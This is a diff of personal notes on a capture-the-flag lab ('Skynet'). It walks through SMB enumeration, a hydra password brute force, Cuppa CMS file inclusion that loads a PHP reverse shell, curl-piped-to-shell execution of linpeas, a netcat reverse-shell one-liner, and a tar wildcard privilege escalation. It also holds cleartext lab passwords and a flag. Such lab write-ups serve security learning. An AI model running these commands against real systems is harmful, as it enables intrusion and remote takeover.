@@ -489,9 +489,9 @@ Nmap done: 1 IP address (1 host up) scanned in 1096.13 seconds
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 143/tcp open  imap        Dovecot imapd
 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-
+-------------------------------------------------------------------------------------------------
 should try SMB enum and check squirrel mail directories including login.php
-
+-------------------------------------------------------------------------------------------------
 ─[user@parrot]─[~]
 └──╼ $gobuster dir -u 10.10.223.65 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ===============================================================
@@ -522,9 +522,9 @@ Finished
 
 #interesting found squirrel mail dir as well as /admin
 
-
+----------------------------------------------------------------------
 enum4linux output:
-
+-------------------------------------------------------------------------------------------------
 
 
 ┌──(kali㉿kali)-[~]
@@ -873,9 +873,9 @@ smb: \> ^C
 A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
 -Miles Dyson
 
-
+-------------------------------------------------------------------------------------------------
 upon reading the downloaded attention.txt file I felt thrown off and not much closer to getting any passwords or access so I must do more digging
-
+-------------------------------------------------------------------------------------------------
 smb: \> cd logs
 smb: \logs\> ls
   .                                   D        0  Wed Sep 18 00:42:16 2019
@@ -892,31 +892,36 @@ getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0
 smb: \logs\> get log3.txt
 getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.4 KiloBytes/sec)
 smb: \logs\> 
-
+-------------------------------------------------------------------------------------------------
 log1.txt appears to be a list of cleartext passwords that can maybe used in a wordlist attack. I have a couple different users enumerated. 
-
+-------------------------------------------------------------------------------------------------
 S-1-5-21-2393614426-3774336851-1116533619-501 SKYNET\nobody (Local User)                                                                            
 S-1-5-21-2393614426-3774336851-1116533619-513 SKYNET\None (Domain Group)
 S-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\milesdyson (Local User)
+-------------------------------------------------------------------------------------------------
+so those can be potential usernames could be used with the password list. As opposed to hydra, which I may need to try depending on how this goes. I went with burpsuite intruder loading in log1.txt as the wordlist and milesdyson as the username, currently I do not believe I have found a correct combination of those two (i found the password a minute later aha)
 
-so those can be potential usernames could be used with the password list. As opposed to hydra, which I may need to try depending on how this goes. I went with burpsuite intruder loading in log1.txt as the wordlist and milesdyson as the username, currently I do not believe I have found a correct combination of those two
+hydra would also be an alternative means of finding the password here. Important note that I had to change the page from login.php to redirect.php
+┌──(kali㉿kali)-[~]
+└─$ hydra -l milesdyson -P log1.txt 10.10.188.99 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user" -V -I
 
+-------------------------------------------------------------------------------------------------
 Okay that found dyson's password: cyborg007haloterminator as that one got a 302 response
-
+-------------------------------------------------------------------------------------------------
 upon logging into his email we see the following email:
-
+-------------------------------------------------------------------------------------------------
 ![[Pasted image 20250422162702.png]]
-
+-------------------------------------------------------------------------------------------------
 SMB Password: )s{A&2Z=F^n_E.B`
-
+-------------------------------------------------------------------------------------------------
 ┌──(kali㉿kali)-[~]
 └─$ smbclient  \\\\10.10.188.99\\milesdyson -U milesdyson
 Password for [WORKGROUP\milesdyson]:
 Try "help" to get a list of possible commands.
 smb: \> 
-
+-------------------------------------------------------------------------------------------------
 when prompted for the password I used the one found in 10.10.188.99/squirrelmail
-
+-------------------------------------------------------------------------------------------------
 
                 9204224 blocks of size 1024. 5831380 blocks available
 smb: \> ls
@@ -988,11 +993,11 @@ smb: \notes\>
                                                                              
 ┌──(kali㉿kali)-[~]
 └─$ 
-
+-------------------------------------------------------------------------------------------------
 looks like there is a CMS that can be accessed in this directory
 
 the website at http://10.10.188.99/45kra24zxs28v3yd/ doesn't tell me much whatsoever. I got stuck here for some time and saw an administrator directory in the weird one we enumerated from logging into milesdyson's smb share 
-
+-------------------------------------------------------------------------------------------------
 ┌──(kali㉿kali)-[~]
 └─$ ffuf -u http://10.10.188.99/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
@@ -1034,11 +1039,11 @@ administrator           [Status: 301, Size: 337, Words: 20, Lines: 10, Duration:
                         [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 98ms]
 :: Progress: [220560/220560] :: Job [1/1] :: 404 req/sec :: Duration: [0:09:08] :: Errors: 0 ::
                      
-
+-------------------------------------------------------------------------------------------------
 http://10.10.188.99/45kra24zxs28v3yd/administrator/ and is shown to be a cuppa cms login page
-
+-------------------------------------------------------------------------------------------------
 Tried default creds of admin admin but that didn't work
-
+-------------------------------------------------------------------------------------------------
 ┌──(kali㉿kali)-[~]
 └─$ ffuf -u http://10.10.188.99/45kra24zxs28v3yd/administrator/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
@@ -1083,11 +1088,11 @@ js                      [Status: 301, Size: 340, Words: 20, Lines: 10, Duration:
 components              [Status: 301, Size: 348, Words: 20, Lines: 10, Duration: 95ms]
 classes                 [Status: 301, Size: 345, Words: 20, Lines: 10, Duration: 98ms]
                         [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 106ms]
-
+-------------------------------------------------------------------------------------------------
 fuzzing the admin page gives us an alerts folder which an exploit exists for the alerts feature for cuppa https://www.exploit-db.com/exploits/25971
-
+-------------------------------------------------------------------------------------------------
 upon reading i realized I could employ the RFI used in practice http://10.10.188.99/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/hosts returns an actual config
-
+-------------------------------------------------------------------------------------------------
 ┌──(kali㉿kali)-[~]
 └─$ vi php-reverse-shell.php
                                                                             
@@ -1097,9 +1102,9 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.188.99 - - [22/Apr/2025 18:47:52] "GET /php-reverse-shell.php HTTP/1.0" 200 -
 
 http://10.10.188.99/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.23.80.154/php-reverse-shell.php
-
+-------------------------------------------------------------------------------------------------
 was entered into the web browser where the exploit db site said it was. I downloaded https://pentestmonkey.net/tools/web-shells/php-reverse-shell?ref=blog.tryhackme.com to create the reverse shell and was able to find the user flag after that
-
+-------------------------------------------------------------------------------------------------
 $ cat /home/milesdyson/user.txt
 7ce5c2109a40f958099283600a9ae807
 $ 
@@ -1111,7 +1116,9 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.188.99 - - [22/Apr/2025 19:06:34] "GET /linpeas.sh HTTP/1.1" 200 -
 10.10.188.99 - - [22/Apr/2025 19:09:15] "GET /linpeas.sh HTTP/1.1" 200 -
 
+-------------------------------------------------------------------------------------------------
 from there I put linpeas on my home directory and wrote on the target "curl 10.23.80.154/linpeas.sh | sh"
+-------------------------------------------------------------------------------------------------
 
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -1122,7 +1129,9 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 
+-------------------------------------------------------------------------------------------------
 linpeas shows scripts being ran as root
+-------------------------------------------------------------------------------------------------
 
 $ cat backup.sh
 #!/bin/bash
@@ -1147,7 +1156,9 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 #
+-------------------------------------------------------------------------------------------------
 $ there is a tar script being ran to compress and backup every file in /home/milesdyson/backups
+-------------------------------------------------------------------------------------------------
 
 ┌──(kali㉿kali)-[~]
 └─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.23.80.154 lport=8888 R
@@ -1163,10 +1174,17 @@ mkfifo /tmp/vhnngg; nc 10.23.80.154 8888 0</tmp/vhnngg | /bin/sh >/tmp/vhnngg 2>
 
 
 https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+
 echo "mkfifo /tmp/lhennp; nc 10.23.80.154 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh" 
 echo "" > --checkpoint=1 
 tar cf archive.tar *
+
+-------------------------------------------------------------------------------------------------
+
+basically the tar command will see the file names as arguments so echoing those commands into file names in cwd actually setup the command to open the privileged shell with root perms
+
+-------------------------------------------------------------------------------------------------
 
 ┌──(kali㉿kali)-[~]
 └─$ nc -lnvp 8888
